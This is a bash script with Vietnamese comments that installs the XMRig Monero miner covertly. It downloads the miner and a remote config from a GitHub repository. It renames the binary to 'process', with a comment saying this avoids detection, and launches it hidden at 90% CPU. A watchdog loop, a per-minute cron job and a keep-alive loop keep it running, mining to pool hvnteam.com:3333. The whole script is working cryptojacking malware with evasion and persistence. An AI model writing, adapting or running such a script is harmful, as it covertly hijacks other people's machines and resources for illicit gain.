#!/bin/bash

# 🛠️ Bước 1: Thêm kho lưu trữ Ubuntu nếu thiếu

echo "🔍 Kiểm tra kho lưu trữ Ubuntu..."
REPO_LINES=(
    "deb http://archive.ubuntu.com/ubuntu jammy main restricted universe multiverse"
    "deb http://archive.ubuntu.com/ubuntu jammy-updates main restricted universe multiverse"
    "deb http://archive.ubuntu.com/ubuntu jammy-security main restricted universe multiverse"
)

for LINE in "${REPO_LINES[@]}"; do
    if ! grep -Fxq "$LINE" /etc/apt/sources.list; then
        echo "$LINE" | sudo tee -a /etc/apt/sources.list
    fi
done

# 🔄 Cập nhật hệ thống và cài đặt các gói cần thiết
echo "⬇ Đang cập nhật hệ thống..."
sudo DEBIAN_FRONTEND=noninteractive apt update && sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y --only-upgrade -o Dpkg::Options::="--force-confold"


# 🔄 Cài đặt Cron nếu chưa có
echo "🛠️ Kiểm tra và cài đặt Cron..."
if ! command -v crontab &> /dev/null; then
    sudo apt install cron -y
    sudo update-rc.d cron defaults
    sudo service cron start


fi

# ⬇ Tải và cài đặt XMRig
mkdir -p ~/xmrig && cd ~/xmrig
if [ ! -f "xmrig-6.22.2-focal-x64.tar.gz" ]; then
    echo "⬇ Đang tải XMRig..."
    wget -q --show-progress https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
fi

echo "📂 Giải nén XMRig..."
tar -xf xmrig-6.22.2-focal-x64.tar.gz
cd xmrig-6.22.2
rm -f config.json
wget https://raw.githubusercontent.com/ngocsuo/mazda6/refs/heads/master/config.json

# 🔄 Đổi tên trình đào để tránh bị phát hiện
mv xmrig process
chmod +x process

# 🛠️ Tạo script khởi động XMRig ẩn
echo '#!/bin/bash
setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
disown
' > start.sh
chmod +x start.sh
./start.sh

# 🛠️ Tạo script giám sát (watchdog) để khởi động lại nếu bị dừng
echo '#!/bin/bash
while true; do
    if ! pgrep -x "process" > /dev/null
    then
        echo "🔄 Trình đào bị dừng! Đang khởi động lại..."
        cd ~/xmrig/xmrig-6.22.2
        setsid nohup ./process --cpu-max-threads-hint 90 > xmrig.log 2>&1 &
        disown
    fi
    sleep 60
done' > watchdog.sh
chmod +x watchdog.sh
setsid nohup ./watchdog.sh > /dev/null 2>&1 &
disown

# 🛠️ Thêm cron job để khởi động lại nếu bị dừng
echo "🛠️ Cấu hình cron để tự động khởi động lại XMRig..."
(crontab -l 2>/dev/null; echo "* * * * * ~/xmrig/watchdog.sh") | crontab -

# 🛠️ Tạo script giữ kết nối liên tục
echo '#!/bin/bash
while true; do 
    sleep 30; 
    curl -m 5 -s -o /dev/null https://www.google.com || exit; 
done' > keep_alive.sh
chmod +x keep_alive.sh
nohup ./keep_alive.sh > keep_alive.log 2>&1 &
disown

# ✅ Hiển thị thông báo hoàn tất
echo "✅ Trình đào XMR trên Pool hvnteam.com:3333 đang chạy ẩn!"
echo "⏳ Kiểm tra thu nhập tại Pool."
